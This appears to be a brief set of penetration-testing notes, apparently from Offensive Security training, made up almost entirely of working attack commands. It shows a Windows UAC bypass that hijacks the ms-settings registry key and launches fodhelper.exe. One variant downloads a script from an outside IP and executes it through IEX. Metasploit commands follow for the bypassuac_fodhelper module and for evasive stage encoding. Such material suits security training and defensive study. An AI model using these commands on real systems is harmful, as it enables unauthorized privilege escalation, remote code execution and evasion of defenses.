```
PS C:\Users\Byte> New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value powershell.exe –Force

PS C:\Users\Offsec> New-ItemProperty -Path HKCU:\Software\Classes\ms-
settings\shell\open\command -Name DelegateExecute -PropertyType String -Force

PS C:\Users\Offsec> C:\Windows\System32\fodhelper.exe


msf5 exploit(multi/handler) > use exploit/windows/local/bypassuac_fodhelper
```

Metasploit:

```
PS C:\Users\Offsec> New-Item -Path HKCU:\Software\Classes\ms-
settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX" -Force

PS C:\Users\Offsec> New-ItemProperty -Path HKCU:\Software\Classes\ms-
settings\shell\open\command -Name DelegateExecute -PropertyType String -Force

PS C:\Users\Offsec> C:\Windows\System32\fodhelper.exe

```


```
msf5 exploit(multi/handler) > set EnableStageEncoding true
EnableStageEncoding => true
msf5 exploit(multi/handler) > set StageEncoder x64/zutto_dekiru
StageEncoder => x64/zutto_dekiru
msf5 exploit(multi/handler) > exploit
```